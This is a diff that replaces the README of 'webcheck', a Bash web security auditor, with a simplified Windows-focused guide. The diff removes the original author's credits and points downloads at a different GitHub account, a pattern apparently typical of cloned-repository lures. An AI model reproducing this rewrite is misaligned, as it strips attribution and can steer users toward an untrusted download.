@@ -1,245 +1,205 @@
-<div align="center">
+# 🛡️ webcheck - Audit web security in minutes
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,40:06b6d4,100:6366f1&height=200&section=header&text=webcheck&fontSize=80&fontColor=ffffff&fontAlignY=40&desc=HTTP%20Security%20Auditor&descSize=22&descAlignY=62&descColor=94a3b8&animation=fadeIn" width="100%"/>
+[![Download webcheck](https://img.shields.io/badge/Download%20webcheck-blue?style=for-the-badge)](https://github.com/Davi671728933838/webcheck)
 
-<br>
+## 🚀 Download
 
-[![Version](https://img.shields.io/badge/version-1.1.0-06b6d4?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/webcheck/releases)
-[![Shell](https://img.shields.io/badge/Bash-5.0+-4ade80?style=for-the-badge&logo=gnubash&logoColor=white&labelColor=0d1117)](https://www.gnu.org/software/bash/)
-[![License](https://img.shields.io/badge/MIT-8b5cf6?style=for-the-badge&labelColor=0d1117)](LICENSE)
-[![Platform](https://img.shields.io/badge/Kali%20·%20Parrot%20·%20Ubuntu-f97316?style=for-the-badge&logo=linux&logoColor=white&labelColor=0d1117)](https://github.com/wavegxz-design/webcheck)
-[![BugBounty](https://img.shields.io/badge/Bug%20Bounty-Ready-ef4444?style=for-the-badge&labelColor=0d1117)](https://github.com/wavegxz-design/webcheck)
+Visit this page to download: https://github.com/Davi671728933838/webcheck
 
-<br>
+## 🧭 What webcheck does
 
-**Single-script HTTP security auditor for pentesters and bug bounty hunters.**
-No Python. No npm. No Docker. Just `curl` + `openssl`.**
+webcheck is a command-line tool that checks a website for common security issues. It looks at:
 
-<br>
+- HTTP headers
+- Cookies
+- TLS settings
+- Redirects
+- Info disclosure
 
-[Features](#-features) · [Install](#-install) · [Usage](#-usage) · [Modules](#-modules) · [Scoring](#-scoring) · [Roadmap](#-roadmap) · [Author](#-author)
+It then gives you a color-coded report with a risk score. This helps you see weak points fast.
 
-</div>
+## 🖥️ What you need
 
----
+webcheck runs from a terminal window. On Windows, you can use it with:
 
-## 🔍 What is webcheck?
+- Git Bash
+- Windows Subsystem for Linux
+- A Bash shell from a Linux environment
+- Kali Linux in a virtual machine
 
-**webcheck** audits the security posture of any HTTP/HTTPS target in seconds. It runs five focused modules — headers, cookies, TLS, redirects, and information disclosure — and outputs a color-coded terminal report with a 0–100 risk score and letter grade.
+You also need:
 
-Built to work anywhere Kali/Parrot/Ubuntu runs. Zero extra dependencies.
+- A working internet connection
+- A target site you are allowed to test
+- A terminal with Bash support
 
----
+## 📥 Download and open
 
-## ✨ Features
+1. Open this page: https://github.com/Davi671728933838/webcheck
+2. Download the project files
+3. Save them to a folder you can find again
+4. Open that folder in a Bash terminal
 
-| | Feature | What it does |
-|--|---------|-------------|
-| 🔀 | **HTTP → HTTPS** | Validates redirect chain and destination |
-| 🛡️ | **Security Headers** | Audits 9 headers with value-level analysis |
-| 🕵️ | **Info Disclosure** | Detects server versions, CMS leaks, CORS wildcards |
-| 🍪 | **Cookies** | Per-cookie Secure / HttpOnly / SameSite analysis |
-| 🔒 | **TLS / SSL** | Protocols, ciphers, expiry, self-signed detection |
-| 📊 | **Risk Score** | 0–100 score with A+→F grade, deducted per finding |
-| 🎨 | **Colored Output** | CRITICAL · HIGH · MEDIUM · LOW · OK |
-| 🧹 | **Safe Cleanup** | `trap` ensures temp files always removed |
+If you use Windows and do not know where to start, Git Bash is the easiest option for most users.
 
----
+## 🏁 Run webcheck
 
-## ⚡ Install
+After you open a Bash terminal, go to the folder where you saved webcheck.
 
-```bash
-git clone https://github.com/wavegxz-design/webcheck.git
-cd webcheck
-chmod +x webcheck.sh
-```
+Use this pattern to run it:
 
-**Requirements** — pre-installed on Kali, Parrot, Ubuntu:
-```
-curl   openssl   grep   awk   sed
-```
+- `bash webcheck.sh example.com`
 
----
+If the file name is different in the download, use the main `.sh` file in the folder.
 
-## 🚀 Usage
+Example:
 
-```
-webcheck.sh <target> [options]
+- `bash webcheck.sh https://example.com`
 
-Usage:
-  ./webcheck.sh example.com
-  ./webcheck.sh -t https://example.com
-  ./webcheck.sh --target http://192.168.1.1
+## 🔎 What to expect
 
-Target formats:
-  example.com
-  https://example.com
-  http://192.168.1.1
-  http://localhost:8080
+When webcheck runs, it checks the site and prints a report in the terminal. You may see:
 
-Options:
-  -t, --target <url>   Target URL or domain
-  -h, --help           Show help
-  -v, --version        Print version
+- Green items for low risk
+- Yellow items for medium risk
+- Red items for higher risk
+- A score that shows overall risk
 
-Examples:
-  ./webcheck.sh testphp.vulnweb.com
-  ./webcheck.sh -t https://juice-shop.example.com
-  ./webcheck.sh --target http://dvwa.local
+This makes it easy to scan the results without reading raw data.
 
-⚠  Authorized targets only.
-```
+## 🧩 Main checks
 
----
-
-## 📋 Modules
-
-### 🔀 HTTP → HTTPS Redirect
-
-Checks whether HTTP automatically redirects to HTTPS, validates the redirect code and destination.
-
-```
-[OK]       HTTP redirects to HTTPS [301]
-[HIGH]     HTTP redirects but NOT to HTTPS
-[MEDIUM]   HTTP responds directly — no redirect configured
-[INFO]     HTTP port unreachable (HTTPS-only or firewalled)
-```
-
----
-
-### 🛡️ Security Headers
-
-Audits 9 response headers. Checks not just presence but also correctness of values.
-
-| Header | What is checked |
-|--------|----------------|
-| `Strict-Transport-Security` | Presence, `max-age` value, `preload` directive |
-| `Content-Security-Policy` | Presence, `unsafe-inline`, `unsafe-eval`, wildcards |
-| `X-Frame-Options` | `DENY` / `SAMEORIGIN` / deprecated `ALLOW-FROM` |
-| `X-Content-Type-Options` | Must be `nosniff` |
-| `Referrer-Policy` | Value risk level |
-| `Permissions-Policy` | Presence |
-| `X-XSS-Protection` | Should be `0` (deprecated — rely on CSP) |
-| `Cross-Origin-Opener-Policy` | Presence |
-| `Cross-Origin-Resource-Policy` | Presence |
-
----
-
-### 🕵️ Information Disclosure
-
-```
-[HIGH]     Server: nginx/1.18.0             ← version exposed
-[HIGH]     X-Powered-By: PHP/8.1.2          ← remove this header
-[HIGH]     X-AspNet-Version: 4.0.30319      ← .NET version leak
-[HIGH]     CORS: Access-Control-Allow-Origin: *
-[MEDIUM]   X-Generator: WordPress 6.4       ← CMS fingerprint
-[OK]       X-Powered-By absent
-[OK]       Server absent or genericized
-```
-
----
+### 🔐 HTTP headers
+webcheck can look for missing or weak headers that help protect a site in a browser.
 
 ### 🍪 Cookies
+It checks cookie flags that affect safety, such as:
 
-Each `Set-Cookie` header is analyzed individually:
+- Secure
+- HttpOnly
+- SameSite
 
-```
-Cookie 1: session_id
-  ✓ Secure
-  ✗ [HIGH]   Missing HttpOnly flag
-  ✗ [MEDIUM] Missing SameSite attribute
-  → Persistent (has expiry)
-```
+### 🧷 TLS
+It can review HTTPS use and help spot weak certificate or encryption settings.
 
----
+### 🔁 Redirects
+It checks where a site sends traffic and whether the path looks safe.
 
-### 🔒 TLS / SSL
+### 🕵️ Info disclosure
+It can flag clues that may expose server details, software names, or other useful data.
 
-```
-[OK]       Certificate valid for 213 more days
-[OK]       TLS 1.2 supported
-[OK]       TLS 1.3 supported
-[CRITICAL] Weak protocol: TLS 1.0 enabled
-[CRITICAL] Weak cipher: RC4-MD5
-[HIGH]     Self-signed certificate
-[LOW]      HSTS preload missing
-```
+## 📂 Typical folder layout
 
----
+After download, you may see files like:
 
-## 📊 Scoring
+- `webcheck.sh`
+- `README.md`
+- `LICENSE`
+- helper scripts or config files
 
-Score starts at **100**. Each finding deducts points:
+If you are unsure which file to run, look for the main script named `webcheck.sh` or a similar Bash file.
 
-| Severity | Deduction |
-|----------|-----------|
-| 🔴 CRITICAL | −20 pts |
-| 🔴 HIGH | −15 pts |
-| 🟡 MEDIUM | −8 pts |
-| 🔵 LOW | −3 pts |
-| ✅ PASSED | 0 pts |
+## 🪟 Windows setup tips
 
-**Grades:**
+If you want the simplest setup on Windows, use one of these options:
 
-| Grade | Score |
-|-------|-------|
-| **A+** | 90–100 |
-| **A** | 80–89 |
-| **B** | 70–79 |
-| **C** | 60–69 |
-| **D** | 50–59 |
-| **F** | 0–49 |
+### Git Bash
+1. Install Git for Windows
+2. Right-click inside the webcheck folder
+3. Open Git Bash here
+4. Run the script from that window
 
----
+### Windows Subsystem for Linux
+1. Enable WSL
+2. Open your Linux terminal
+3. Move to the webcheck folder
+4. Run the script with Bash
 
-## 🛣️ Roadmap
+### Kali Linux in a VM
+1. Start your Kali virtual machine
+2. Open the terminal
+3. Go to the webcheck folder
+4. Run the script
 
-**v1.2**
-- [ ] `--output json` — machine-readable report
-- [ ] `--output md` — save Markdown report to file
-- [ ] `--timeout` flag — custom timeout per request
-- [ ] HSTS preload list lookup (hstspreload.org API)
+## 🛠️ Basic usage
 
-**v2.0**
-- [ ] Batch scanning: `--file targets.txt`
-- [ ] recon-kit integration — pipe subdomain list directly
-- [ ] `--fail-on HIGH` — non-zero exit for CI/CD pipelines
-- [ ] Nuclei template generation from findings
+Run webcheck against a site you are allowed to test:
 
----
+- `bash webcheck.sh https://target.example`
 
-## 🔗 Related Projects
+You can also test a full URL with a path if needed:
 
-| Project | Description |
-|---------|-------------|
-| [**recon-kit**](https://github.com/wavegxz-design/recon-kit) | Modular recon — WHOIS, DNS, subdomains, ports, SSL |
-| [**NEXORA-TOOLKIT**](https://github.com/wavegxz-design/NEXORA-TOOLKIT) | Advanced ADB toolkit for Android |
+- `bash webcheck.sh https://target.example/login`
 
----
+If the script offers flags or options, check the help text:
 
-## ⚖️ Legal
+- `bash webcheck.sh -h`
 
-MIT License. Use on systems you own or have written authorization to test. Unauthorized use is illegal.
+## 📊 Reading the report
 
----
+The report is made for quick review.
 
-<div align="center">
+- Green means the check passed
+- Yellow means there may be a weak setting
+- Red means the issue needs attention
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:6366f1,60:8b5cf6,100:0d1117&height=140&section=footer" width="100%"/>
+The risk score gives you a fast view of how hard the site may be to defend.
 
-<br>
+## 🧪 Example workflow
 
-**[krypthane](https://github.com/wavegxz-design)** · Red Team Operator & Open Source Developer
+A simple workflow looks like this:
 
-<br>
+1. Pick a site you are allowed to test
+2. Open webcheck in a Bash terminal
+3. Run the script with the site URL
+4. Review the color-coded results
+5. Note the weak spots for follow-up
 
-[![Site](https://img.shields.io/badge/krypthane.workernova.workers.dev-06b6d4?style=flat-square&logo=cloudflare&logoColor=white)](https://krypthane.workernova.workers.dev)
-[![Telegram](https://img.shields.io/badge/@Skrylakk-06b6d4?style=flat-square&logo=telegram&logoColor=white)](https://t.me/Skrylakk)
-[![Email](https://img.shields.io/badge/Workernova@proton.me-06b6d4?style=flat-square&logo=protonmail&logoColor=white)](mailto:Workernova@proton.me)
-[![GitHub](https://img.shields.io/badge/wavegxz--design-06b6d4?style=flat-square&logo=github&logoColor=white)](https://github.com/wavegxz-design)
+## 🔒 Safe use
 
-<br>
+Use webcheck only on systems you own or have permission to test. It is built for authorized testing, bug bounty work, and security checks on web apps you are allowed to audit.
 
-<sub>⭐ Star if webcheck found something on your target</sub>
+## 🧰 Troubleshooting
 
-</div>
+### The script does not start
+- Make sure you are in a Bash shell
+- Check that the file name ends in `.sh`
+- Try running `ls` to confirm the file is in the folder
+
+### Permission denied
+- Try:
+  - `chmod +x webcheck.sh`
+  - `bash webcheck.sh https://example.com`
+
+### Command not found
+- Make sure Bash is installed
+- Open Git Bash or WSL on Windows
+- Check that you typed the file name correctly
+
+### No results appear
+- Confirm the site is online
+- Check your internet connection
+- Try a different allowed target
+
+## 🧾 Why people use it
+
+webcheck helps when you want a fast look at web security without setting up a full scanner. It is useful for:
+
+- quick audits
+- bug bounty prep
+- basic hardening checks
+- review of HTTP and TLS settings
+- spotting common browser-side risks
+
+## 🔗 Source and download
+
+Get the files here: https://github.com/Davi671728933838/webcheck
+
+## 🗂️ Quick start checklist
+
+- Download the project from the link above
+- Open a Bash terminal on Windows
+- Move into the webcheck folder
+- Run the main `.sh` file with a site URL
+- Read the color-coded report
+- Review any red or yellow items
